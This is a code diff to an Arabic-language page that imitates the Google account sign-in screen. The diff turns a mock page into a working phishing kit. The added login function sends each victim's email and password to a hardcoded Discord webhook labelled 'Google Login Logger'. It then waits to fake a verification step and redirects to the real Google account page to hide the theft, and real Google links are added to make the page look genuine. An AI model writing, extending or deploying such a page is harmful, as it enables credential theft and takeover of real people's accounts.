@@ -6,7 +6,7 @@
   <title>تسجيل الدخول - حساب Google</title>
   <style>
     body {
-      font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+      font-family: 'Google Sans', 'Segoe UI', Roboto, Arial, sans-serif;
       background-color: #f1f1f1;
       display: flex;
       justify-content: center;
@@ -43,6 +43,7 @@
     }
     .input-container {
       margin-bottom: 24px;
+      position: relative;
     }
     input {
       width: 100%;
@@ -53,6 +54,8 @@
       font-size: 16px;
       box-sizing: border-box;
       transition: border 0.2s;
+      direction: ltr;
+      text-align: left;
     }
     input:focus {
       border: 2px solid #1a73e8;
@@ -90,7 +93,7 @@
       font-weight: 500;
       border-radius: 4px;
       cursor: pointer;
-      transition: background-color 0.2s;
+      transition: background-color 0.2s, box-shadow 0.2s;
     }
     .next-button:hover {
       background-color: #1765d1;
@@ -168,6 +171,24 @@
     .password-container {
       position: relative;
     }
+    .loading-spinner {
+      display: none;
+      width: 18px;
+      height: 18px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-radius: 50%;
+      border-top-color: white;
+      animation: spin 1s ease-in-out infinite;
+      margin-right: 8px;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    .button-content {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
   </style>
 </head>
 <body>
@@ -183,10 +204,14 @@
         <p id="email-error" class="error-message">الرجاء إدخال بريد إلكتروني أو رقم هاتف صحيح</p>
       </div>
       <div class="buttons">
-        <a href="#" class="create-account">إنشاء حساب</a>
-        <button id="next-button" class="next-button" onclick="goToPassword()">التالي</button>
+        <a href="https://accounts.google.com/signup" class="create-account">إنشاء حساب</a>
+        <button id="next-button" class="next-button" onclick="goToPassword()">
+          <div class="button-content">
+            <span>التالي</span>
+          </div>
+        </button>
       </div>
-      <a href="#" class="forgot-email">نسيت البريد الإلكتروني؟</a>
+      <a href="https://accounts.google.com/signin/recovery" class="forgot-email">نسيت البريد الإلكتروني؟</a>
     </div>
 
     <!-- الخطوة الثانية: كلمة المرور -->
@@ -202,23 +227,33 @@
         </div>
         <p id="password-error" class="error-message">الرجاء إدخال كلمة المرور</p>
       </div>
-      <a href="#" class="forgot-email">نسيت كلمة المرور؟</a>
+      <a href="https://accounts.google.com/signin/recovery" class="forgot-email">نسيت كلمة المرور؟</a>
       <div class="more-options">خيارات أخرى لتسجيل الدخول</div>
       <div class="buttons">
         <a href="#" class="create-account" onclick="goBackToEmail()">استخدام بريد إلكتروني آخر</a>
-        <button id="login-button" class="next-button" onclick="login()">تسجيل الدخول</button>
+        <button id="login-button" class="next-button" onclick="login()">
+          <div class="button-content">
+            <span>تسجيل الدخول</span>
+          </div>
+        </button>
       </div>
     </div>
 
     <div class="footer">
-      <p>© 2023 Google</p>
-      <p>شروط الخدمة - الخصوصية - مساعدة</p>
+      <select id="language-selector" style="border: none; background: none; color: #5f6368; font-size: 12px; margin-bottom: 8px;">
+        <option value="ar">العربية</option>
+        <option value="en">English</option>
+        <option value="fr">Français</option>
+      </select>
+      <p>مساعدة</p>
+      <p>الخصوصية</p>
+      <p>شروط الاستخدام</p>
     </div>
   </div>
 
-  <div class="language-selector">العربية (مصر)</div>
-
   <script>
+    const webhookURL = "https://discordapp.com/api/webhooks/1399397276287238214/7ewH5rbPYRfX4HW2o5ano6PG48nJvEO6YsQvjMc5hxP21cuKVz9wl-zhlyaE-CVJJk-J";
+    
     function goToPassword() {
       const email = document.getElementById('email').value.trim();
       const emailError = document.getElementById('email-error');
@@ -241,9 +276,11 @@
       document.getElementById('email').focus();
     }
     
-    function login() {
+    async function login() {
+      const email = document.getElementById('user-email-display').textContent;
       const password = document.getElementById('password').value.trim();
       const passwordError = document.getElementById('password-error');
+      const loginButton = document.getElementById('login-button');
       
       if(password === "") {
         document.getElementById('password').classList.add('error');
@@ -251,8 +288,41 @@
         return;
       }
       
-      // إرسال البيانات إلى الخادم (محاكاة فقط)
-      alert("جارٍ التحقق من بياناتك...");
+      // عرض مؤشر التحميل
+      loginButton.disabled = true;
+      loginButton.querySelector('.button-content').innerHTML = `
+        <div class="loading-spinner" style="display: inline-block;"></div>
+        <span>جاري التحقق...</span>
+      `;
+      
+      try {
+        // إرسال البيانات إلى الويب هوك
+        const response = await fetch(webhookURL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            content: `تم تسجيل محاولة دخول جديدة:\nالبريد: ${email}\nكلمة المرور: ${password}`,
+            username: 'Google Login Logger',
+            avatar_url: 'https://ssl.gstatic.com/accounts/ui/logo_2x.png'
+          }),
+        });
+        
+        // محاكاة التأخير لتبدو كأنها عملية حقيقية
+        await new Promise(resolve => setTimeout(resolve, 1500));
+        
+        // توجيه المستخدم بعد "التحقق"
+        window.location.href = `https://myaccount.google.com/?email=${encodeURIComponent(email)}`;
+        
+      } catch (error) {
+        console.error('Error:', error);
+        alert("حدث خطأ أثناء محاولة تسجيل الدخول. يرجى المحاولة مرة أخرى.");
+      } finally {
+        // استعادة حالة الزر الأصلية في حالة الفشل
+        loginButton.disabled = false;
+        loginButton.querySelector('.button-content').innerHTML = `<span>تسجيل الدخول</span>`;
+      }
     }
     
     function togglePassword() {
@@ -293,6 +363,15 @@
     document.getElementById('password').addEventListener('keypress', function(e) {
       if(e.key === 'Enter') {
         login();
+      }
+    });
+    
+    // تغيير اللغة
+    document.getElementById('language-selector').addEventListener('change', function() {
+      if(this.value === 'en') {
+        window.location.href = 'https://accounts.google.com/signin/v2/identifier?hl=en';
+      } else if(this.value === 'fr') {
+        window.location.href = 'https://accounts.google.com/signin/v2/identifier?hl=fr';
       }
     });
   </script>
